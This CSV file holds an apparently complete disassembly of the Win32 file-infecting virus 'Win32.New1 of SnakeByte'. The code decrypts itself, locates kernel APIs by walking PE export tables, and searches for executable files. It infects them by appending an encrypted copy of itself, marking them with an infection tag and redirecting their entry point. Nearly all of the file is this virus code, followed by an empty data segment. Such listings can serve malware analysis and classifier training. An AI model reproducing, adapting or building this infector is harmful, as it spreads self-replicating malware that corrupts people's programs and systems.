Opcode,Operand,Comment
model,flat,
CODE,segment,para public 'CODE' use32
assume,cs:CODE,
assume,"es:nothing,","ss:nothing, ds:nothing, fs:nothing, gs:nothing"
public,start,
start,proc,near		; DATA XREF: sub_401414+130r
call,near,ptr loc_401007+4
loc_401005:,;,DATA XREF: CODE:00401035r
jno,short,$+2
loc_401007:,;,CODE XREF: startp
test,"eax,",81000077h
start,endp,
sub,"al,",24h
add,"eax,",8B004010h
or,"al,",24h
add,"esp,",4
push,ecx,
pop,ebp,
mov,"edi,",ebp
cmp,"edi,",0
jz,short,loc_401048
mov,"ecx,",ebp
mov,"ebx,",819h
add,"ecx,",offset loc_401048
loc_40102E:,;,CODE XREF: CODE:00401046j
mov,"dl,",[ecx]
sub,"dl,",13h
neg,dl,
xor,"dl,",byte ptr ss:(loc_401005+1)[ebp]
mov,"[ecx],",dl
sub,"ebx,",1
add,"ecx,",1
cmp,"ebx,",0
jnz,short,loc_40102E
loc_401048:,;,CODE XREF: CODE:0040101Fj
jmp,loc_40128E,
loc_40104D:,;,DATA XREF: CODE:004012F6o
push,9,
pop,ebx,
lea,"edx,",dword_401724[ebp]
mov,"esi,",ebp
add,"esi,",offset dword_4016E8
loc_40105E:,;,CODE XREF: CODE:00401095j
and,"ss:word_401586[ebp],",0
mov,"eax,",28D5CD9h
push,0,
pop,ecx,
mov,"cl,",[edx]
add,"edx,",1
sub,"eax,",2A05875h
call,sub_40131E,
push,edx,
add,"[esp],",ecx
pop,edx,
push,ss:dword_4017DD[ebp],
pop,edi,
mov,"[esi],",edi
mov,"eax,",28C11E7h
inc,esi,
add,"esi,",3
dec,ebx,
jnz,short,loc_40105E
jmp,loc_40112F,
sub_40109C,proc,near		; CODE XREF: CODE:0040117Ap
call,sub_4011D4,
jb,locret_40112E,
mov,"edx,",0FFFFE413h
add,"edx,",1BEDh
add,"edx,",ss:dword_4017A9[ebp]
cmp,word,"ptr [edx],	5A4Dh"
jz,short,loc_4010CE
mov,"eax,",1BC1h
add,"eax,",19h
cmp,"eax,",1BDAh
jz,short,loc_401129
loc_4010CE:,;,CODE XREF: sub_40109C+21j
cmp,word,"ptr [edx+3Ch], 0"
jnz,short,loc_4010D7
jmp,short,loc_401129
loc_4010D7:,;,CODE XREF: sub_40109C+37j
xor,"esi,",esi
dec,ss:dword_4017D9[ebp],
add,"esi,",[edx+3Ch]
cmp,"esi,",ss:dword_4015B8[ebp]
ja,short,loc_401129
add,"esi,",edx
movzx,"ebx,",word ptr [esi]
cmp,"ebx,",4550h
jz,short,loc_401107
mov,"ecx,",6D86h
add,"ecx,",0Bh
cmp,"ecx,",6D91h
jz,short,loc_401129
loc_401107:,;,CODE XREF: sub_40109C+59j
cmp,dword,"ptr [esi+4Ch], 4E657731h"
jnz,short,loc_401112
jmp,short,loc_401129
loc_401112:,;,CODE XREF: sub_40109C+72j
mov,"cx,",[esi+16h]
and,"cx,",0F000h
cmp,"cx,",2000h
jz,short,loc_401129
call,sub_401414,
jb,short,locret_40112E
loc_401129:,;,CODE XREF: sub_40109C+30j
call,sub_401262,
locret_40112E:,;,CODE XREF: sub_40109C+5j
retn,,
sub_40109C,endp,
loc_40112F:,;,CODE XREF: CODE:00401097j
push,ss:dword_401590[ebp],
pop,ss:dword_4011C7[ebp],
push,ss:dword_4017D9[ebp],
pop,ss:dword_401588[ebp],
push,ss:dword_4017A5[ebp],
pop,ss:dword_4011C1[ebp],
mov,"ss:dword_401594[ebp],",14h
mov,"ebx,",offset dword_4016E2
add,"ebx,",ebp
call,sub_4017E9,
shl,"edx,",0Dh
add,"eax,",1
cmp,"eax,",0
jz,short,loc_401194
loc_401174:,;,CODE XREF: CODE:00401192j
adc,"edx,",5493811h
call,sub_40109C,
mov,"ecx,",ss:dword_401594[ebp]
cmp,"ecx,",0
jz,short,loc_401194
call,sub_401805,
cmp,"eax,",0
jnz,short,loc_401174
loc_401194:,;,CODE XREF: CODE:00401172j
mov,"edi,",ss:dword_4017AD[ebp]
push,edi,
call,ss:dword_4016F0[ebp],
jmp,short,loc_4011BB
loc_4011A3:,;,CODE XREF: CODE:004012B0j
mov,"ebx,",ss:dword_401590[ebp]
mov,"ss:dword_4011C7[ebp],",ebx
mov,"edi,",ss:dword_4017A5[ebp]
mov,"ss:dword_4011C1[ebp],",edi
loc_4011BB:,;,CODE XREF: CODE:004011A1j
cmp,"ebp,",0
jz,short,loc_4011CD
db,0BAh,; ยบ
dword_4011C1,dd,0			; DATA XREF: CODE:0040114Dw
db,"81h,",0C2h
dword_4011C7,dd,0			; DATA XREF: CODE:00401135w
jmp,edx,
loc_4011CD:,;,CODE XREF: CODE:004011BEj
push,0,
call,ExitProcess,
sub_4011D4,proc,near		; CODE XREF: sub_40109Cp
push,0,
push,0,
push,3,
push,0,
push,1,
mov,"ebx,",0C0000000h
push,ebx,
mov,"ebx,",ebp
add,"ebx,",offset dword_4015C4
push,ebx,
call,ss:dword_4016F8[ebp],
add,"eax,",1
jz,short,loc_401273
xor,"ss:dword_4017D9[ebp],",1397961h
sub,"eax,",1
push,eax,
pop,ss:dword_4017D5[ebp],
shl,"ebx,",6
sub_4011D4,endp,
sub_40120F,proc,near		; CODE XREF: sub_401414+54p
push,ss:dword_4015B8[ebp],
pop,edx,
push,edx,
push,0,
push,edx,
push,0,
push,4,
push,0,
push,ss:dword_4017D5[ebp],
call,ss:dword_401700[ebp],
push,eax,
pop,ss:dword_4017BD[ebp],
pop,edx,
cmp,"eax,",0
jz,short,loc_401267
sub,"ecx,",ecx
push,edx,
push,ecx,
push,ecx,
mov,"eax,",1Dh
sub,"eax,",1Bh
push,eax,
push,ss:dword_4017BD[ebp],
call,ss:dword_401708[ebp],
cmp,"eax,",0
jz,short,sub_401262
mov,"ecx,",eax
mov,"ss:dword_4017A9[ebp],",ecx
clc,,
retn,,
sub_40120F,endp,
sub_401262,proc,near		; CODE XREF: sub_40109C+8Dp
call,sub_401275,
loc_401267:,;,CODE XREF: sub_40120F+28j
push,ss:dword_4017D5[ebp],
call,ss:dword_4016E8[ebp],
loc_401273:,;,CODE XREF: sub_4011D4+22j
stc,,
retn,,
sub_401262,endp,
sub_401275,proc,near		; CODE XREF: sub_401262p
push,ss:dword_4017A9[ebp],
call,ss:dword_4016F4[ebp],
push,ss:dword_4017BD[ebp],
call,ss:dword_4016E8[ebp],
retn,,
sub_401275,endp,
loc_40128E:,;,CODE XREF: CODE:00401048j
mov,"ecx,",[esp]
sub,"cx,",cx
mov,"ss:dword_4017C5[ebp],",0
add,"ss:dword_4017C5[ebp],",7
loc_4012A5:,;,CODE XREF: CODE:004012D0j
mov,"eax,",ss:dword_4017C5[ebp]
cmp,"eax,",0
jnz,short,loc_4012B5
jmp,loc_4011A3,
loc_4012B5:,;,CODE XREF: CODE:004012AEj
cmp,word,"ptr [ecx],	5A4Dh"
jz,short,loc_4012D2
loc_4012BC:,;,CODE XREF: CODE:004012E8j
inc,ecx,
sub,"ecx,",10001h
inc,ss:dword_4017C5[ebp],
sub,"ss:dword_4017C5[ebp],",2
jmp,short,loc_4012A5
loc_4012D2:,;,CODE XREF: CODE:004012BAj
add,"ecx,",3Ch
mov,"edx,",[ecx]
dec,ecx,
sub,"ecx,",3Bh
xchg,"edx,",ecx
add,"ecx,",edx
xchg,"edx,",ecx
cmp,word,"ptr [edx],	4550h"
jz,short,loc_4012EA
jmp,short,loc_4012BC
loc_4012EA:,;,CODE XREF: CODE:004012E6j
mov,"ss:dword_4017C9[ebp],",ecx
mov,"ss:dword_4017B9[ebp],",edx
mov,"ecx,",offset loc_40104D
add,"ecx,",ebp
push,ecx,
retn,,
sub_4012FF,proc,near		; CODE XREF: sub_401414+2Cp
pusha,,
mov,"eax,",ss:dword_4017B1[ebp]
xor,"edx,",edx
mov,"ecx,",ss:dword_4017D1[ebp]
push,eax,
div,ecx,
sub,"ecx,",edx
pop,eax,
add,"eax,",ecx
mov,"ss:dword_4017B1[ebp],",eax
popa,,
retn,,
sub_4012FF,endp,
sub_40131E,proc,near		; CODE XREF: CODE:00401078p
pusha,,
mov,"eax,",0FFFF82EDh
add,"eax,",7D13h
add,"eax,",ss:dword_4017B9[ebp]
adc,"ss:dword_4017D9[ebp],",edx
mov,"esi,",[eax+78h]
add,"esi,",ss:dword_4017C9[ebp]
add,"esi,",1Ch
add,"eax,",ss:dword_4017C9[ebp]
shl,"ebx,",16h
mov,"ss:dword_4017E1[ebp],",eax
mov,"eax,",[esi]
add,"eax,",ss:dword_4017C9[ebp]
add,"esi,",4
mov,"ss:dword_4017C1[ebp],",eax
add,"eax,",ss:dword_4017C9[ebp]
mov,"ss:dword_4017CD[ebp],",eax
mov,"eax,",0FFFF592Ah
add,"eax,",0A6D6h
add,"eax,",ss:dword_4017C1[ebp]
loc_40137D:,;,CODE XREF: sub_40131E+B2j
push,eax,
mov,"ebx,",[eax]
add,"ebx,",ss:dword_4017C9[ebp]
mov,"eax,",ebx
mov,"esi,",26F6h
sub,"esi,",26F6h
add,"esi,",ebx
push,ecx,
push,esi,
mov,"ss:dword_4017A1[ebp],",edx
cld,,
loc_40139E:,;,CODE XREF: sub_40131E+91j
mov,"bh,",[edx]
cmp,"bh,",[esi]
jnz,short,loc_4013B1
inc,ecx,
sub,"ecx,",2
cmp,"ecx,",0
jz,short,loc_4013D2
inc,esi,
inc,edx,
jmp,short,loc_40139E
loc_4013B1:,;,CODE XREF: sub_40131E+84j
mov,"edx,",ss:dword_4017A1[ebp]
pop,esi,
pop,ecx,
pop,eax,
dec,eax,
add,"eax,",5
inc,ss:word_401586[ebp],
cmp,"ss:word_401586[ebp],",2002h
jz,short,loc_40140D
jmp,short,loc_40137D
loc_4013D2:,;,CODE XREF: sub_40131E+8Dj
add,"esp,",0Ch
movzx,"eax,",ss:word_401586[ebp]
shl,"eax,",1
add,"eax,",ss:dword_4017CD[ebp]
mov,"ebx,",eax
movzx,"eax,",word ptr [ebx]
clc,,
rcl,"eax,",2
add,"eax,",ss:dword_4017E1[ebp]
mov,"ebx,",ss:dword_4017C9[ebp]
add,"ebx,",[eax]
mov,"ss:dword_4017DD[ebp],",0
add,"ss:dword_4017DD[ebp],",ebx
popa,,
retn,,
loc_40140D:,;,CODE XREF: sub_40131E+B0j
pop,esi,
popa,,
jmp,loc_4011BB,
sub_40131E,endp,
sub_401414,proc,near		; CODE XREF: sub_40109C+86p
mov,"esi,",ss:dword_4017A9[ebp]
mov,"edx,",esi
add,"edx,",[esi+3Ch]
inc,ecx,
add,"edx,",3Ch
mov,"ecx,",[edx]
sub,"edx,",3Ch
push,ss:dword_4015B8[ebp],
pop,eax,
add,"eax,",861h
mov,"ss:dword_4017B1[ebp],",eax
mov,"ss:dword_4017D1[ebp],",ecx
call,sub_4012FF,
mov,"eax,",ss:dword_4017B1[ebp]
mov,"ss:dword_4017E5[ebp],",0
add,"ss:dword_4017E5[ebp],",eax
pusha,,
call,sub_401275,
popa,,
mov,"ss:dword_4015B8[ebp],",eax
call,sub_40120F,
jb,loc_401582,
push,ss:dword_4017A9[ebp],
pop,esi,
mov,"edx,",esi
add,"edx,",[esi+3Ch]
mov,"esi,",0FFFFE120h
add,"esi,",1EE0h
add,"esi,",edx
movzx,"ebx,",word ptr [esi+6]
sub,"ebx,",1
imul,"ebx,",28h
inc,edx,
add,"edx,",77h
add,"edx,",ebx
xor,"ebx,",ebx
add,"ebx,",[esi+74h]
clc,,
rcl,"ebx,",3
add,"edx,",ebx
mov,"eax,",[esi+34h]
mov,"ss:dword_4017A5[ebp],",eax
mov,"ecx,",[esi+28h]
mov,"ss:dword_401590[ebp],",ecx
mov,"ebx,",0FFFF40A8h
add,"ebx,",0BF58h
add,"ebx,",[edx+10h]
push,0,
pop,ecx,
add,"ecx,",ebx
add,"ebx,",[edx+14h]
push,ebx,
mov,"eax,",ecx
add,"eax,",[edx+0Ch]
mov,"ss:dword_40158C[ebp],",eax
mov,"[esi+28h],",eax
mov,"eax,",[edx+10h]
push,eax,
add,"eax,",861h
mov,"ss:dword_4017B1[ebp],",eax
push,dword,ptr [esi+3Ch]
pop,ss:dword_4017D1[ebp],
call,sub_4012FF,
mov,"eax,",ss:dword_4017B1[ebp]
mov,dword,"ptr [edx+10h], 0"
add,"[edx+10h],",eax
pop,eax,
add,"eax,",861h
mov,"[edx+8],",eax
mov,"eax,",[edx+10h]
add,"eax,",[edx+0Ch]
mov,dword,"ptr [esi+50h], 0"
add,"[esi+50h],",eax
or,dword,"ptr [edx+24h], 0A0000020h"
mov,dword,"ptr [esi+4Ch], 4E657731h"
pop,edi,
call,sub_401849,
mov,"ebx,",ss:dword_4016DE[ebp]
mov,byte,"ptr ss:(loc_401005+1)[ebp], bl"
lea,"esi,",start[ebp]
mov,"edx,",48h
add,"edi,",ss:dword_4017A9[ebp]
loc_401555:,;,CODE XREF: sub_401414+143j
movsb,,
dec,edx,
jnz,short,loc_401555
push,819h,
pop,edx,
loc_40155F:,;,CODE XREF: sub_401414+158j
lodsb,,
xor,"al,",byte ptr ss:(loc_401005+1)[ebp]
neg,al,
add,"al,",13h
stosb,,
dec,edx,
jnz,short,loc_40155F
mov,"edx,",ss:dword_401594[ebp]
not,ecx,
inc,edx,
sub,"edx,",2
mov,"ss:dword_401594[ebp],",edx
clc,,
retn,,
loc_401582:,;,CODE XREF: sub_401414+59j
stc,,
retn,,
sub_401414,endp,
db,"8Bh,",0C3h
word_401586,dw,0			; DATA XREF: CODE:0040105Ew
dword_401588,dd,0			; DATA XREF: CODE:00401141w
dword_40158C,dd,0			; DATA XREF: sub_401414+C1w
dword_401590,dd,0			; DATA XREF: CODE:0040112Fr
dword_401594,dd,0			; DATA XREF: CODE:00401153w
dword_401598,dd,8 dup(0)		; DATA XREF: sub_4017E9+7o
dword_4015B8,dd,0			; DATA XREF: sub_40109C+46r
dd,2,dup(0)
dword_4015C4,dd,0			; DATA XREF: sub_4011D4+12o
dd,45h,dup(0)
db,2,dup(0)
dword_4016DE,dd,0			; DATA XREF: sub_401414+124r
dword_4016E2,dd,58652E2Ah		; DATA XREF: CODE:0040115Do
db,"65h,",0
dword_4016E8,dd,0			; DATA XREF: CODE:00401058o
dword_4016EC,dd,0			; DATA XREF: sub_4017E9+Fr
dword_4016F0,dd,0			; DATA XREF: CODE:0040119Br
dword_4016F4,dd,0			; DATA XREF: sub_401275+6r
dword_4016F8,dd,0			; DATA XREF: sub_4011D4+19r
dword_4016FC,dd,0			; DATA XREF: sub_401805+1Ar
dword_401700,dd,0			; DATA XREF: sub_40120F+17r
dword_401704,dd,0			; DATA XREF: sub_401849+7r
dword_401708,dd,0			; DATA XREF: sub_40120F+3Er
aWin32_new1OfSn,db,"'Win32.New1 of SnakeByte',0"
dword_401724,dd,6F6C430Bh		; DATA XREF: CODE:00401050r
dd,"61486573h,","656C646Eh, 6E69460Eh, 72694664h, 69467473h"
dd,"941656Ch,","646E6946h,	736F6C43h, 6E550F65h, 5670616Dh"
dd,"4F776569h,","6C694666h, 72430B65h, 65746165h, 656C6946h"
dd,"69460D41h,","654E646Eh, 69467478h, 1241656Ch, 61657243h"
dd,"69466574h,","614D656Ch, 6E697070h, 470C4167h, 69547465h"
dd,"6F436B63h,","0D746E75h, 5670614Dh, 4F776569h, 6C694666h"
db,65h,
dword_4017A1,dd,0			; DATA XREF: sub_40131E+79w
dword_4017A5,dd,0			; DATA XREF: CODE:00401147r
dword_4017A9,dd,0			; DATA XREF: sub_40109C+16r
dword_4017AD,dd,0			; DATA XREF: CODE:00401194r
dword_4017B1,dd,0			; DATA XREF: sub_4012FF+1r
dd,0,
dword_4017B9,dd,0			; DATA XREF: CODE:004012F0w
dword_4017BD,dd,0			; DATA XREF: sub_40120F+1Ew
dword_4017C1,dd,0			; DATA XREF: sub_40131E+3Dw
dword_4017C5,dd,0			; DATA XREF: CODE:00401294w
dword_4017C9,dd,0			; DATA XREF: CODE:004012EAw
dword_4017CD,dd,0			; DATA XREF: sub_40131E+49w
dword_4017D1,dd,0			; DATA XREF: sub_4012FF+9r
dword_4017D5,dd,0			; DATA XREF: sub_4011D4+32w
dword_4017D9,dd,0			; DATA XREF: sub_40109C+3Dw
dword_4017DD,dd,0			; DATA XREF: CODE:00401082r
dword_4017E1,dd,0			; DATA XREF: sub_40131E+2Cw
dword_4017E5,dd,0			; DATA XREF: sub_401414+37w
sub_4017E9,proc,near		; CODE XREF: CODE:00401164p
call,sub_401826,
mov,"edx,",ebp
add,"edx,",offset dword_401598
push,edx,
push,ebx,
call,ss:dword_4016EC[ebp],
mov,"ss:dword_4017AD[ebp],",eax
retn,,
sub_4017E9,endp,
sub_401805,proc,near		; CODE XREF: CODE:0040118Ap
call,sub_401826,
mov,"ecx,",offset dword_401598
add,"ecx,",ebp
push,ecx,
mov,"ecx,",ss:dword_4017AD[ebp]
xor,"edx,",0EFFD27h
push,ecx,
call,ss:dword_4016FC[ebp],
retn,,
sub_401805,endp,
sub_401826,proc,near		; CODE XREF: sub_4017E9p sub_401805p
pusha,,
lea,"esi,",dword_4015C4[ebp]
mov,"ebx,",0
add,"ebx,",114h
loc_401838:,;,CODE XREF: sub_401826+19j
mov,byte,"ptr [esi],	0"
add,"esi,",1
dec,ebx,
jnz,short,loc_401838
popa,,
retn,,
sub_401826,endp,
adc,"ss:dword_401588[ebp],",ebx
sub_401849,proc,near		; CODE XREF: sub_401414+11Fp
pusha,,
add,"ecx,",ss:dword_4016DE[ebp]
call,ss:dword_401704[ebp],
add,"ecx,",eax
push,ecx,
pop,ss:dword_4016DE[ebp],
popa,,
retn,,
sub_401849,endp,
dd,66h,dup(0)
align,4,
dd,180h,dup(?)
CODE,ends,
DATA,segment,para public 'DATA' use32
assume,cs:DATA,
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
db,?,;
